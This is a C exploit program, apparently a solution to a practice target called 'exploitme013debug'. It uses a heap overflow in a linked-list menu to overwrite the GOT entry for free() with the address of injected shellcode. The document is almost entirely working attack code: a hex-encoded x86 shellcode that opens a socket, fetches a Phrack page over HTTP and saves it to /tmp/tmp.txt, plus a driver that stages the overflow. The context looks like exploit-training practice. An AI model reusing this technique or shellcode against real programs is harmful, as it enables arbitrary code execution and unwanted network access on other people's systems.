#include <stdio.h>
#include <unistd.h>

// Downloads Once upon a free() from Phrack into /tmp/tmp.txt
char shellcode[] =
	"\x31\xc0\x50\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb0\x66\x6a\x01"
	"\x5b\xcd\x80\xbb\xc8\xc7\x14\xa2\x53\x81\xeb\xc6\xc7\x14\x52"
	"\x53\x89\xe6\x31\xdb\x53\x6a\x10\x56\x50\x89\xe1\x6a\x66\x58"
	"\xb3\x03\xcd\x80\x8b\x1c\x24\x50\x68\x72\x67\x0a\x0a\x68\x63"
	"\x6b\x2e\x6f\x68\x70\x68\x72\x61\x68\x73\x74\x3a\x20\x68\x30"
	"\x0a\x48\x6f\x68\x50\x2f\x31\x2e\x68\x20\x48\x54\x54\x68\x3d"
	"\x74\x78\x74\x68\x6d\x6f\x64\x65\x68\x64\x3d\x39\x26\x68\x35"
	"\x37\x26\x69\x68\x73\x75\x65\x3d\x68\x6c\x3f\x69\x73\x68\x2e"
	"\x68\x74\x6d\x68\x73\x75\x65\x73\x68\x20\x2f\x69\x73\x68\x2a"
	"\x47\x45\x54\x89\xe1\x80\xc1\x01\xb0\x04\x89\xc2\xb2\x43\xcd"
	"\x80\x31\xc0\x50\x68\x2e\x74\x78\x74\x68\x2f\x74\x6d\x70\x68"
	"\x2f\x74\x6d\x70\x89\xe3\xb0\x08\x66\xb9\xa4\x01\xcd\x80\x89"
	"\xc5\x52\x52\xb2\x08\x89\xe1\x8b\x5c\x24\x60\xb0\x03\xcd\x80"
	"\x89\xc1\x67\xe3\x0c\x89\xc2\x89\xe1\x89\xeb\xb0\x04\xcd\x80"
	"\xeb\xe3\x40\x31\xdb\xcd\x80";

int main(int argc,char **argv){
	int fds[2];	// Passes data from child to parent
	int ctp[2]; 	// Passes data from parent to child
	int pid;
	char *args[] = {"./exploitme013debug",NULL};
	unsigned long scaddr;

	char *env[] = {shellcode,NULL};
	scaddr = 0xbffffffa - strlen(shellcode) - strlen(args[0]);
	printf( "[-] Using return address 0x%08x for shellcode...\n", scaddr );

	pipe(fds);				// create new pair of file descriptors.  Data written to fds[1] appears on (i.e., can be read from) fds[0]
	pipe(ctp);
	pid = fork(); 				// fork to create a child process

	if(pid < 0)
		return 1;

	if(pid == 0) {											/* child process */
		close(fds[1]);										// We will never write to this pipe... that would be bad
		dup2(fds[0],STDIN_FILENO);				// update stdin to use the new file descriptor created above
		close(STDOUT_FILENO); 						// Fuck output... If we were careful and read it, maybe.  But no.

		execve(args[0],args,env);

	} else { 														/* parent process */
		close(fds[0]);										// We will never read from this pipe.

		char buf[1024];										/* Create a buffer to store our exploit in */

		bzero(buf,sizeof(buf));						/* Clean it */
		sprintf(buf,
			"1\nAAAA\n"
			"1\nBBBB\n");										// Put something in the list.  Need at least two items because we need next in the first item to contain a valid address (or at least the three MSBs)

		printf("[-] Creating list with appropriate structure...\n");
		write(fds[1],buf,strlen(buf));		// Create new list
		write(fds[1],"2\n\0",3);

		printf("[-] Completed list generation.  Press a key to send overflow.");
		getchar();

		bzero(buf,sizeof(buf));

		sprintf(buf,"4\n0\nAAAABBBBCCCC"
		"\xa8\x9a\04\x08" 								/* Address of free() in GOT */
		"D\n");														/* Overflows 0x44 into the LSB of the first chunk's next pointer, making it point 4 bytes lower than the current */
		write(fds[1],buf,strlen(buf));		/* Overflow third entry to actually reference GOT  */

		write(fds[1],"2\n\0",3);

		printf("[-] Overflow sent.  Press a key to rewrite free() GOT entry.");
		getchar();

		bzero(buf,sizeof(buf));

		sprintf(buf,"4\n2\n"
		"\x90\x90\x90\x90"								// Address of shellcode.. replaced below
		"\n");

		long *bufptr;
		bufptr = (long *)&buf + 1;
		*bufptr = scaddr;	// Toss shellcode address into buffer

		write(fds[1],buf,strlen(buf));		/* Overwrite GOT entry for free() with shellcode address */
		printf("[-] GOT free() clobbered.  Please to be enjoying reading your g-ph1l3z! File stored at /tmp/tmp.txt\n");
		wait(NULL);
	}

	return 0;
}
